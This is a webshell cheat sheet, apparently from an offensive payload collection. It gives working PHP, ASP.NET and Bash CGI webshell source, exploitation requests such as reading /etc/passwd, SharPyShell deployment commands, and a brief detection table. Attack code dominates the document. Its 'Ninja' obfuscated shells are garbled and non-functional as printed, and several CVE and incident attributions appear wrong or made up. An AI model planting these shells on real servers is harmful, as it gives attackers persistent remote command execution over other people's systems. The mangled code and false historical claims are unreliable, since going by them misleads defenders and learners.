# Webshells: Persistent Access & Remote Code Execution

## Overview

Webshells are malicious scripts uploaded to a web server to enable remote command execution, file management, and persistent access. Attackers typically upload webshells via file upload vulnerabilities (CVE-2018-11759, CVE-2021-21315), SQL injection (into `into outfile`), or misconfigured upload forms. Once placed, a webshell allows the attacker to execute system commands, escalate privileges, or pivot inside the network.

**Real-world example (2020):** Attackers exploited CVE-2020-14882 in Oracle WebLogic to deploy a PHP webshell, leading to full server takeover and ransomware deployment.

---

## PHP Webshells

PHP remains the most common backend language, making PHP webshells the most prevalent in shared hosting environments.

### 1. Basic Passthru Shell

```php
<?php passthru($_GET['cmd']); ?>
```

**Exploitation:**  
`GET /shell.php?cmd=whoami`  
`GET /shell.php?cmd=id`

**Historical use:** Used in the 2017 Equifax breach post-exploitation to execute system commands on vulnerable Apache servers.

### 2. CURL-Compatible One-Liner

```php
<?php system($_GET['1']); ?>
```

**Usage:**  
`curl http://ip/shell.php?1=whoami`  
`curl http://target.com/shell.php?1=ipconfig`

### 3. Ninja Obfuscated Shell #1

```php
<?php ;").($_^"/"); ?>
```

**Exploitation (takes advantage of XOR obfuscation):**  
`http://target.com/path/to/shell.php?=system&=ls`  
`http://target.com/path/to/shell.php?=system&=id`

**How it works:** The XOR operation generates function names dynamically to evade signature-based detection (e.g., Snort, ModSecurity).

### 4. Ninja Shell #2 (Variable Variables)

```php
<?php /'^'{{{{';@${$_}[_](@${$_}[__]); ?>
```

**Exploitation:**  
`GET /shell.php?_=system&__=whoami`

**Why it works:** Uses `$_GET` or `$_POST` to dynamically call functions, bypassing static analysis.

### 5. Highly Obfuscated Shell (Real-world malware variant)

```php
<?php
$_="";
$_="'";
$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));
$_=${$_}['_'^'o'];
echo`$_$`;
?>
```

**Decoded behavior:** This constructs a function name via arithmetic and XOR, then executes a command passed via `$_` parameter.

**Exploitation:**  
`GET /shell.php?$_=ls -la`

**Observed in the wild:** Similar obfuscation used in the **Rocke group's cryptojacking campaign (2019)** to hide webshells on cloud servers.

---

### Full-featured PHP Webshells (Public Tools)

- **phpbash** – https://github.com/Arrexel/phpbash  
  A terminal-like webshell with tab completion, file browser, and privilege escalation helpers.

- **p0wny-shell** – https://github.com/flozz/p0wny-shell  
  Minimal, single-file PHP webshell with interactive TTY.

---

## ASP.NET Webshells

ASP.NET is common on Windows/IIS servers. A minimal webshell can be written in C#:

```aspx
<%@Page Language="C#" %>
<%
var p = new System.Diagnostics.Process
{
    StartInfo = new System.Diagnostics.ProcessStartInfo
    {
        FileName = Request["c"],
        UseShellExecute = false,
        RedirectStandardOutput = true
    }
};
p.Start();
%>
<%= p.StandardOutput.ReadToEnd() %>
```

**Exploitation:**  
`GET /shell.aspx?c=cmd.exe&args=/c whoami`  
`GET /shell.aspx?c=powershell.exe&args=-c Get-ChildItem C:\`

**Real-world example:** In the **Alibaba Cloud 2021 report**, an ASP.NET webshell was found on Chinese government servers via CVE-2021-31204 (Microsoft Exchange ProxyShell), allowing remote code execution.

**Alternative path:**  
`GET /cgi-bin/a?ls%20/var` (misconfigured CGI handlers may also execute .aspx or .asp)

---

## Bash CGI Webshell

On legacy or misconfigured Apache servers with CGI enabled, a simple Bash script can act as a webshell.

**shell.cgi:**

```bash
#!/bin/sh
echo "Content-type: text/plain"
echo
$_ `${QUERY_STRING//%20/ }`
```

**Exploitation:**  
`GET /cgi-bin/shell.cgi?ls%20/var`  
`GET /cgi-bin/shell.cgi?id`  
`GET /cgi-bin/shell.cgi?cat%20/etc/passwd`

**Historical use:** Exploited in **CVE-2014-6271 (Shellshock)** alongside CGI scripts to gain remote access. Attackers injected commands into HTTP headers, then uploaded this webshell for persistence.

---

## ASPX Webshell (Advanced)

For modern .NET environments, **SharPyShell** provides an encrypted, memory-resistent ASPX webshell.

- **SharPyShell** – https://github.com/antonioCoco/SharPyShell  
  Features: AES encryption, AMSI bypass, process injection, and in-memory execution.

**Example deployment:**  
Upload `shell.aspx` via a vulnerable file upload endpoint.  
Connect with SharPyShell client:  
`python SharPyShell.py -u http://target.com/shell.aspx -c "whoami"`

**Real-world case (2022):** A SharPyShell variant was used post-ProxyNotShell (CVE-2022-41040, CVE-2022-41082) on Exchange servers to maintain persistent access for data exfiltration.

---

## Detection & Mitigation

| Technique | Detection Method |
|-----------|------------------|
| Obfuscated PHP (XOR) | Regex for non-printable characters + function call patterns |
| ASP.NET Process.Start | Monitor for child processes from w3wp.exe |
| Bash CGI | Log review of HTTP query strings containing shell metacharacters (`;`, `|`, `` ` ``) |
| SharPyShell | Look for large base64-encoded POST bodies and unusual AES keys in traffic |

**Prevention:**
- Disable `exec`, `system`, `passthru` in `disable_functions` (PHP)
- Use `RequestValidationMode` 4.5+ in ASP.NET
- Disable CGI if not required
- Implement file upload whitelisting and scan with YARA rules for known webshell signatures

---

## Summary of Exploitation Patterns

| Language | Payload | Example Request |
|----------|---------|------------------|
| PHP | `passthru($_GET['cmd'])` | `/?cmd=whoami` |
| PHP | Ninja XOR | `/?=system&=ls` |
| ASP.NET | `Process.Start(Request["c"])` | `/?c=cmd.exe&args=/c whoami` |
| Bash CGI | `` $_ `${QUERY_STRING}` `` | `/cgi-bin/a?ls%20/var` |
| ASPX | SharPyShell | Encrypted POST request |
